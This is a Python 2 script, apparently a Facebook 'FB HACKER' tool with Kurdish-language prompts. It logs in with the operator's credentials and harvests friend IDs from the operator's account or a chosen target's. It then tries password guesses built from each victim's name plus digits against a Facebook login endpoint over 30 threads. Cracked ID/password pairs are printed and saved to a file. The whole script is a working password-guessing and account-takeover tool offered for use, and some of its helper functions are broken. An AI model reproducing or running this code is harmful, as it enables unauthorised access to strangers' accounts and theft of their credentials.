#!/ufr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
print("FB GRABER")
os.system('clear')




reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def kelwa():
	print "\x1b[1;96m🚶‍ Chwna Darawa"
	os.sys.exit()
                                        
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def anime(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(000.1)


#### LOGO ####
logo = """
 \x1b[31;1m   _____ _____  _____          _____   
 \x1b[31;1m  / ____|  __ \|  __ \   /\   |  __ \  
 \x1b[31;1m | |  __| |__) | |  | | /  \  | |__) | 
\x1b[31;1m  | | |_ |  _  /| |  | |/ /\ \ |  _  /  
\x1b[31;1m  | |__| | | \ \| |__| / ____ \| | \ \  
\x1b[31;1m   \_____|_|  \_\_____/_/    \_\_|  \_\ 
                                       
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;95mTkaya Bosta \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\x1b[37;1m+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×++×+×+×+×+
\x1b[31;1m@         !  𝑇𝑂𝑋𝐼𝐶 ༒ 𝐺𝑅𝐷𝐴𝑅                @
\x1b[31;1m@              Version: 1                @                
\x1b[31;1m@              FB HACKER                 @
\x1b[37;1m+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×++×+×+×+×+
"""

RH = """
 \x1b[31;1m   _____ _____  _____          _____   
 \x1b[37;1m  / ____|  __ \|  __ \   /\   |  __ \  
 \x1b[31;1m | |  __| |__) | |  | | /  \  | |__) | 
\x1b[37;1m  | | |_ |  _  /| |  | |/ /\ \ |  _  /  
\x1b[31;1m  | |__| | | \ \| |__| / ____ \| | \ \  
\x1b[37;1m   \_____|_|  \_\_____/_/    \_\_|  \_\ 
                                       
"""
print(RH)
CorrectUsername = "hama"
CorrectPassword = "goold"
loop = 'true'
while (loop == 'true'):
    username = raw_input("\x1b[34;1m👨‍ \x1b[1;95mID \x1b[31;1m@Daxilka>>\x1b[1;91m")
    if (username == CorrectUsername):
    	password = raw_input("\x1b[34;1m🤖 \x1b[1;95mPassword \x1b[37;1m@Daxilka>> \x1b[1;91m")
                                                                               
        if (password == CorrectPassword):
            print "Daxl Bwet ba ID " + username #Noop=hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;96m Passwordakat Halaya"
            print " welcome  to  my  server  1337 erbil "
    else:
        print "\033[1;96mIDya Kat Halaya "
        print "welcome  to  my  server  1337 erbil"

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('Tkaya FB Nwe Daxil Ka ')
		print('\x1b[31;1m<-------------$\x1b[36;1mLOGIN\x1b[31;1m$------------->')
		id = raw_input('\x1b[35;1m[🆔️]¤EMAIL/ID¤♤> \x1b[37;1m')
		pwd = raw_input('\x1b[35;1m[⛔]¤PASSWORD¤♡> \x1b[31;1m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[31;1m Kesha La Xatakat Haya"
			kelwa()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[32;1m[✓]Login Bw Ba Sarkawtwey'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[31;1m[!]There is no connection[!]"
				kelwa()
		if 'checkpoint' in url:
			print("\n\x1b[31;1m[!] Bbwra Am Account La Checkpointa Bakar Nayat[!]")
			os.system('rm -rf login.txt')
			time.sleep(1)
			kelwa()
		else:
			print("\n\x1b[31;1m[¿]Email w Passwordt Halaya[¿]")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[[31;1m[♤] Bbwra Token Ka Halaya [♤]"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		namefb = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		subid = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91m Account Kat La checkpointa"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		kelwa()
	os.system("clear")
	print logo
	#INFORMATION OF USER
	print "~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\x1b[32;1mRasha×wa7sh/ Name >>"+namefb
	print "\x1b[34;1mRasha×wa7sh/ ID >>"+id
	print '\x1b[33;1mRasha×wa7sh/ TotalSub >>'+subid
	print "~~~~~~~~~~~~~~~~~~~~~~~~"
	print ""
	print "===================="
	print "\x1b[37;1m[1]> Dast Pe Krdn Ba Hack FB"
	print "\x1b[37;1m[2]> Bo Update Krdna Wa"
	print "\x1b[37;1m[0]> Chuna Darawa"
	print "===================="
	#INFORMATION OF USER
	option()

def option():
	unikers = raw_input("\n\x1b[31;1mRasha\x1b[37;1mWa7sh>>\x1b[33;1m")
	if unikers =="":
		print "\x1b[31;1m[!]Tkaya Ba Batali Je Mahela"
		option()
	elif unikers =="1":
		graber()
	elif unikers =="2":
		os.system('clear')
		print logo
		anime("<<<<<<<<PREPARE TO ♡●♡UPDATE TOOL >>>>>>")
		os.system('bash update.sh')
	elif unikers =="0":
		anime('LOGIN OUT ACCOUNT PLEASE WAIT')
		os.system('rm -rf login.txt')
		kelwa()
	else:
		print "\x1b[31;1m Tkaya Shte Sarbaxo Manwsa"
		option()

def graber():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[31;1mToken Halaya Tkaya Daxl Barawa"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\x1b[31;1m{1}~~Hack Krdn La Regay Friend wa "
	print "\x1b[31;1m{2}~~Hack Krdn La Regay ID Xallkawa Frindyan Zoor Be"
	print "\x1b[31;1m{0}~~Chwna Darawa"
	startgrab()

def startgrab():
	peak = raw_input("Rasha+Wa7sh>> ")
	if peak=="":
		print "\x1b[1;91mTkaya Ba Batale Je Mahela"
		startgrab()
	elif peak =="1":
		os.system('clear')
		print logo
		print "@@@@@@@@@@@#Rasha÷Wa7sh#@@@@@@@@@@@"
		anime('\033[1;91mDarhenani ID Kan \033[1;91m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("[♤]ID Kasaka Bnwsa>>>")
		print "@@@@@@@@@@@#Rasha÷wa7sh#@@@@@@@@@@@"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"Rasha/ Name :  "+op["name"]
		except KeyError:
			print"\x1b[31;1mBbwra ID ka Nadozra Yawa"
			raw_input("[GARANAWA]Enter Bka")
			graber()
		print"\x1b[32;1mWargrtne ID...."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mTkaya Boshayaka Ba Jwane Pr Bkara wa"
		startgrab()
	
	print "\x1b[32;1m[♡]Koy ID kan>>"+str(len(id))
	anime('Tkaya Bosta.................................')
	titik = ['.   ','..  ','... ','....','.....']
	for o in titik:
		print("\r\x1b[37;1m[☆]Cracking"+o),;sys.stdout.flush();time.sleep(1)
	print "\n                            \x1b[37;1m <●>°•°<●>Rasha<●>°•°<●>"
	print "   \x1b[31;1m®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®"
	anime('          \x1b[34;1m  Dast Pekrdn Ba Hackaka Tkaya Chawarwan Ba..... ')
	print  "  \033[1;92m®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('Graber')
		except OSError:
			pass #Rasha
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[37;1m Hack Bu Akretawa'											
				print '\x1b[37;1mNAWE >>> '+ b['name']											
				print '\x1b[37;1mID kay >>>' + user											
				print '\x1b[37;1mPASSWORD kay >>>' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[37;1mAccountaka La Checkpointa'
				    print '\x1b[37;1m NAWE >>> ' + b ['name']
				    print '\x1b[37;1mID kay >>> ' + user
				    print '\x1b[37;1mPASSWORD kay >>> ' + pass1 + '\n'
				    cek = open("Graber/Id_pass.txt", "a")
				    cek.write("ID:" +user+ " Password:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '1212'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[37;1m Hack Bu Akretawa'											
				            print '\x1b[37;1mNAWE >>> '+ b['name']											
				            print '\x1b[37;1mID kay >>>' + user											
				            print '\x1b[37;1mPASSWORD kay >>>' + pass2 + '\n'													
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[37;1mAccountaka La Checkpointa'
				               print '\x1b[37;1m NAWE >>> ' + b ['name']
				               print '\x1b[37;1mID kay >>> ' + user
				               print '\x1b[37;1mPASSWORD kay >>> ' + pass2  + '\n'
				               cek = open("Graber/id_pass.txt", "a")
				               cek.write("ID:" +user+ " Pass:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['first_name']+'1122'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[37;1m Hack Bu Akretawa'											
				                       print '\x1b[37;1mNAWE >>> '+ b['name']											
				                       print '\x1b[37;1mID kay >>>' + user											
				                       print '\x1b[37;1mPASSWORD kay >>>' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[37;1mAccountaka La Checkpointa'
				                           print '\x1b[37;1m NAWE >>> ' + b ['name']
				                           print '\x1b[37;1mID kay >>> ' + user
				                           print '\x1b[37;1mPASSWORD kay >>> ' + pass3 + '\n'
				                           cek = open("Graber/id_pass.txt", "a")
				                           cek.write("ID:" +user+ " Pass:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + '12345@@'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[37;1m Hack Bu Akretawa'											
				                                   print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                   print '\x1b[37;1mID kay >>>' + user											
				                                   print '\x1b[37;1mPASSWORD kay >>>' + pass4  + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[37;1mAccountaka La Checkpointa'
				                                       print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                       print '\x1b[37;1mID kay >>> ' + user
				                                       print '\x1b[37;1mPASSWORD kay >>> ' + pass4 + '\n'
				                                       cek = open("Graber/id_pass.txt", "a")
				                                       cek.write("ID:" +user+ " Pass:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = b['first_name'] + '12345aa'												
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[37;1m Hack Bu Akretawa'											
				                                               print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                               print '\x1b[37;1mID kay >>>' + user											
				                                               print '\x1b[37;1mPASSWORD kay >>>' + pass5  + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[37;1mAccountaka La Checkpointa'
				                                                   print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                                   print '\x1b[37;1mID kay >>> ' + user
				                                                   print '\x1b[37;1mPASSWORD kay >>> ' + pass5 + '\n'
				                                                   cek = open("Graber/id_pass.txt", "a")
				                                                   cek.write("ID:" +user+ " Pass:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = '1122334455'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[37;1m Hack Bu Akretawa'											
				                                                           print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                           print '\x1b[37;1mID kay >>>' + user											
				                                                           print '\x1b[37;1mPASSWORD kay >>>' + pass6  + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[37;1mAccountaka La Checkpointa'
				                                                               print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                                               print '\x1b[37;1mID kay >>> ' + user
				                                                               print '\x1b[37;1mPASSWORD kay >>> ' + pass6  + '\n'
				                                                               cek = open("Graber/id_pass.txt", "a")
				                                                               cek.write("ID:" +user+ " Pass:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'12345'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[37;1m Hack Bu Akretawa'											
				                                                                       print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                                       print '\x1b[37;1mID kay >>>' + user											
				                                                                       print '\x1b[37;1mPASSWORD kay >>>' + pass7  + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[37;1mAccountaka La Checkpointa'
				                                                                           print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                                                           print '\x1b[37;1mID kay >>> ' + user
				                                                                           print '\x1b[37;1mPASSWORD kay >>> ' + pass7  + '\n'
				                                                                           cek = open("Graber/id_pass.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '12345678'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[37;1m Hack Bu Akretawa'											
				                                                                                   print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                                                   print '\x1b[37;1mID kay >>> ' + user											
				                                                                                   print '\x1b[37;1mPASSWORD kay >>>' + pass8  + '\n'			
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[37;1mAccountaka La Checkpointa'
				                                                                                       print '\x1b[37;1mNAWE >>> ' + b ['name']
				                                                                                       print '\x1b[37;1mID kay >>> '  + user
				                                                                                       print '\x1b[37;1mPASSWORD kay >>> ' + pass8  + '\n'
				                                                                                       cek = open("Graber/id_pass.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '123456789'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[37;1m Hack Bu Akretawa'											
				                                                                                               print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                                                               print '\x1b[37;1mID kay >>>' + user											
				                                                                                               print '\x1b[37;1mPASSWORD kay >>>' + pass9  + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[37;1mAccountaka La Checkpointa'
				                                                                                                   print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                                                                                   print '\x1b[37;1mID kay >>> ' + user
				                                                                                                   print '\x1b[37;1mPASSWORD kay >>> ' + pass9  + '\n'
				                                                                                                   cek = open("Graber/id_pass.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
											                                       
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
        anime("\x1b[32;1m>>>>>>>>>>>>>>>\x1b[31;1mRasha\x1b[37;1mwa7sh\x1b[32;1m<<<<<<<<<<<<<<<")
	
	print '\x1b[32;1m Crack Krdnaka Kotay Hat [√]^_^ '
	print"\x1b[31;1mKoy Hack Bu/\x1b[31;1mCHECKPOINT\x1b[37;1m: \x1b[32;1m"+str(len(oks))+"\x1b[31;1m/\x1b[33;1m"+str(len(cekpoint))
	print ""
	print(logo)
	anime("\x1b[37;1m✓✓✓✓✓✓✓✓✓✓" ) #Rasha
	anime("==========ADMIN==========")
	anime("Rasha Wa7sh")
	anime("==========ADMIN==========")
	print ""
	print ""
	raw_input("\n\x1b[31;1m [Bo Dwbara Krdnawa]=> enter bka")
	menu()

if __name__ == '__main__':
	login()
